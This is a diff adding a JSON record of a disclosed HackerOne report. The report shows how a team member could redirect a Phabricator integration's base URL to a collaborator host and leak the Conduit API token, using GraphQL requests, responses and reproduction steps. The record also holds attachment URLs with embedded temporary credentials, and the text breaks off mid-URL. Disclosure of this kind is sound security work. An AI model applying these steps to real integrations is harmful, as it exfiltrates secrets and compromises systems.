@@ -1,0 +1,550 @@
+{
+    "id": 1161141,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTYxMTQx",
+    "url": "https://hackerone.com/reports/1161141",
+    "title": "Improper data update process on UpdatePhabricatorIntegration mutation leads to leak of Phabricator Conduit API token.",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "critical",
+    "readable_substate": "Informative",
+    "created_at": "2021-04-12T06:03:10.667Z",
+    "submitted_at": "2021-04-12T06:03:10.811Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "nukedx",
+        "url": "/nukedx",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": true,
+        "verified": true,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 13,
+        "url": "https://hackerone.com/security",
+        "handle": "security",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "HackerOne",
+            "twitter_handle": "Hacker0x01",
+            "website": "https://hackerone.com",
+            "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2021-04-30T05:54:40.703Z",
+    "bug_reporter_agreed_on_going_public_at": "2021-04-24T06:58:39.859Z",
+    "team_member_agreed_on_going_public_at": "2021-04-30T05:54:40.497Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Details\n**Title**: Improper data update process on `UpdatePhabricatorIntegration` mutation leads to leak of Phabricator Conduit API token.\n**Risk**: High\n**Impact**: High\n**Exploitability**: High\n**Target**: `base_url` parameter on `UpdatePhabricatorIntegration` mutation at `/graphql` endpoint.\n\n## Introduction\nSensitive data exposure occurs when an application, company, or other entity inadvertently exposes personal data. Sensitive data exposure differs from a data breach, in which an attacker accesses and steals information.\n\n## Synopsis\n**Phabricator Conduit API** is using simple verification system and requires a valid api token for system bots, integrations etc to get full access to the **Phabricator** instances.\n\n**HackerOne** is allowing their program users to add various integrations for their programs, such as **Phabricator**.  When user with enough permissions adds connection details for the **Phabricator** system stores this information and enables settings options.\n\nSettings for **Phabricator** integration are fetched through GraphQL via using `PhabricatorLayoutQuery` operation, when executed users are fetching similar result as below (see F1262314):\n```json\n{\n  \"data\": {\n    \"team\": {\n      \"id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTI1NzQ=\",\n      \"phabricator_integration\": {\n        \"id\": \"Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA1\",\n        \"__typename\": \"PhabricatorIntegration\",\n        \"base_url\": \"https://skima.is/\",\n        \"title\": \"{{title}}\",\n        \"description\": \"{{details_markdown}}\",\n        \"process_phabricator_status_change\": true,\n        \"process_phabricator_comment_added\": true,\n        \"process_h1_status_change\": true,\n        \"process_h1_comment_added\": true\n      },\n      \"__typename\": \"Team\",\n      \"handle\": \"test-phab-api-leak\",\n      \"custom_field_attributes\": {\n        \"total_count\": 0,\n        \"edges\": [],\n        \"__typename\": \"CustomFieldAttributeConnection\"\n      }\n    }\n  }\n}\n```\n\nAs we can see from the results, there is no API token information is revealed due to security measures, when we manipulate request and try to fetch API token with `api_token` field which was field used on initial integration add process, GraphQL returns following error (see F1262318):\n```json\n{\n  \"errors\": [\n    {\n      \"message\": \"Field 'api_token' doesn't exist on type 'PhabricatorIntegration'\",\n      \"locations\": [\n        {\n          \"line\": 29,\n          \"column\": 5\n        }\n      ],\n      \"path\": [\n        \"fragment PhabricatorDisconnectForm\",\n        \"phabricator_integration\",\n        \"api_token\"\n      ],\n      \"extensions\": {\n        \"code\": \"undefinedField\",\n        \"typeName\": \"PhabricatorIntegration\",\n        \"fieldName\": \"api_token\"\n      }\n    }\n  ]\n}\n```\n\nOn **Phabricator** integration UI users can only change bi-directional commenting, updates and report escalation settings (see F1262320). When any change is done, `UpdatePhabricatorIntegration` mutation is executed on GraphQL as following (see F1262329):\n```json\n{\n  \"operationName\": \"UpdatePhabricatorIntegration\",\n  \"variables\": {\n    \"team_id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=\",\n    \"title\": \"{{title}}\",\n    \"description\": \"{{details_truncated}}\",\n    \"process_h1_comment_added\": true,\n    \"process_h1_status_change\": true,\n    \"process_phabricator_comment_added\": true,\n    \"process_phabricator_status_change\": true\n  },\n  \"query\": \"mutation UpdatePhabricatorIntegration($team_id: ID!, $base_url: String, $api_token: String, $title: String, $description: String, $process_h1_comment_added: Boolean, $process_h1_status_change: Boolean, $process_phabricator_comment_added: Boolean, $process_phabricator_status_change: Boolean) {\\n  updatePhabricatorIntegration(input: {team_id: $team_id, base_url: $base_url, api_token: $api_token, title: $title, description: $description, process_h1_comment_added: $process_h1_comment_added, process_h1_status_change: $process_h1_status_change, process_phabricator_comment_added: $process_phabricator_comment_added, process_phabricator_status_change: $process_phabricator_status_change}) {\\n    was_successful\\n    errors(first: 100) {\\n      edges {\\n        node {\\n          id\\n          type\\n          field\\n          message\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    team {\\n      id\\n      phabricator_integration {\\n        id\\n        base_url\\n        title\\n        description\\n        process_phabricator_status_change\\n        process_phabricator_comment_added\\n        process_h1_status_change\\n        process_h1_comment_added\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"\n}\n```\nAs we can see this is actually similar to initial integration create process, let's see what happens if we try to change `base_url` field and GraphQL replies as following (see F1262334):\n```json\n{\n  \"data\": {\n    \"updatePhabricatorIntegration\": {\n      \"was_successful\": true,\n      \"errors\": {\n        \"edges\": [],\n        \"__typename\": \"ErrorConnection\"\n      },\n      \"team\": {\n        \"id\": \"Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=\",\n        \"phabricator_integration\": {\n          \"id\": \"Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA4\",\n          \"base_url\": \"https://bixp32pnbkbisrmuxgsrrzn8lzrufj.burpcollaborator.net\",\n          \"title\": \"{{title}}\",\n          \"description\": \"{{details_truncated}}\",\n          \"process_phabricator_status_change\": true,\n          \"process_phabricator_comment_added\": true,\n          \"process_h1_status_change\": true,\n          \"process_h1_comment_added\": true,\n          \"__typename\": \"PhabricatorIntegration\"\n        },\n        \"__typename\": \"Team\"\n      },\n      \"__typename\": \"UpdatePhabricatorIntegrationPayload\"\n    }\n  }\n}\n```\n\nIt looks like we are able to update `base_url` and HackerOne just does DNS query to check if target host is active and not controlling if user trying to update existing connection, it's also possible to change `api_token`too but we do not need it.\n\nNow let's try to see if we are able to leak token in system, all we need to do is finding active report on system, since there is also no active escalation control on `/reports/<reportid>/escalate_to_phabricator` endpoint unlike `/reports/<reportid>/escalate_to_jira` (see F1262353). We can try to escalate to our Burp Collaborator.\n\nFirstly we will view a triage report and escalate it to the valid **Phabricator** (see F1262348), after that we will change `base_url` to our Burp Collaborator (see F1262349).\n\nNow everything is ready to go just send escalate to **Phabricator** request again without deleting old one (see F1262350) and check if our collaborator got hit.\n\nWhen we check our burp collaborator, we will see that api token is leaked (see F1262342), now we can restore base url and restore **Phabricator** settings.\n\n## Root cause of the issue\n**HackerOne** is using `UpdatePhabricatorIntegration` mutation for both creating and updating **Phabricator** integration however, do not verify that existence of connection.\n\nThey are checking if there is active connection and showing settings on UI for according to it, meanwhile not verifying existence of connection is allowing update of the URL for integration.\n\nWhile team member can use any none triaged report to escalating issue to **Phabricator**, they can also abuse improper escalation check on `/reports/<reportid>/escalate_to_phabricator` endpoint and leak the API token.\n\n## Steps to reproduce\n1. Enable Burp Suite or any proxy for tracking and intercepting request done.\n2. Create a new team on https://hackerone.com/teams/new/sandbox or use existing team you are member of.\n3. Go to **Phabricator** integration located on https://hackerone.com/team_handle/phabricator_integration\n4. Set up your **Phabricator** integration\n5. Triage a report and escalate it to **Phabricator** integration.\n6. Update **Phabricator** integration and intercept the request, add following to the GraphQL query: `\"base_url\":\"https://yourcollab\"` and send the request.\n7. Send escalate to the **Phabricator** request again for the report, notice that you will get **500** error or create new report and escalate it.\n8. Check your collaborator server and notice that token is leaked.\n\n## Impact\n\nA malicious team member with enough rights for controlling **Phabricator** integration settings can alternate existing connections URL and leak api token for it by escalating report then revert setting.\n\nSince not all team members might have administrator rights on **Phabricator** instance, they can gain access to the Conduit API which is having all permission on the system which could lead to complete compromising of it.",
+    "weakness": {
+        "id": 18,
+        "name": "Information Disclosure"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1262314,
+            "file_name": "fetched.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vksy8nvglpv6w7w0sde7y8f6m4tf?response-content-disposition=attachment%3B%20filename%3D%22fetched.png%22%3B%20filename%2A%3DUTF-8%27%27fetched.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c64ea6ad5e9b454098ba8dba2d8466d9004eace6c36e58a78564dca62464a484",
+            "file_size": 143367,
+            "type": "image/png"
+        },
+        {
+            "id": 1262318,
+            "file_name": "error.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m47k15c2muys64775ihk97lkkjoh?response-content-disposition=attachment%3B%20filename%3D%22error.png%22%3B%20filename%2A%3DUTF-8%27%27error.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f0786a4fa79daf85cc0fb6f0c561885594930756d0f6c919a06e89a52646341c",
+            "file_size": 127743,
+            "type": "image/png"
+        },
+        {
+            "id": 1262320,
+            "file_name": "phab-settings.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h8e1nvodm03zokjg9myjpagxbd0e?response-content-disposition=attachment%3B%20filename%3D%22phab-settings.png%22%3B%20filename%2A%3DUTF-8%27%27phab-settings.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48d454a340e568086b3312c2387f0ca9a46fd3d42054fe51e54f6fe6e467c17c",
+            "file_size": 34210,
+            "type": "image/png"
+        },
+        {
+            "id": 1262329,
+            "file_name": "update.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/n6rv8bk04q9jwh14jxlihcpbaddo?response-content-disposition=attachment%3B%20filename%3D%22update.png%22%3B%20filename%2A%3DUTF-8%27%27update.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=875b9d2dab083c5cbd85ec625d879af865a52d47ff84df376785d58a1f1685c3",
+            "file_size": 153210,
+            "type": "image/png"
+        },
+        {
+            "id": 1262334,
+            "file_name": "changed.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zq924hsyfqtd4kt5zw9jnfwhquit?response-content-disposition=attachment%3B%20filename%3D%22changed.png%22%3B%20filename%2A%3DUTF-8%27%27changed.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=99bcf4b84f0c7999f7c4b25be50ce34b4fb0f6475e132b4eeeaf040fab853a6b",
+            "file_size": 161377,
+            "type": "image/png"
+        },
+        {
+            "id": 1262342,
+            "file_name": "token-leaked.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2lpdhishxs0ghbebz69dzemusncp?response-content-disposition=attachment%3B%20filename%3D%22token-leaked.png%22%3B%20filename%2A%3DUTF-8%27%27token-leaked.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHY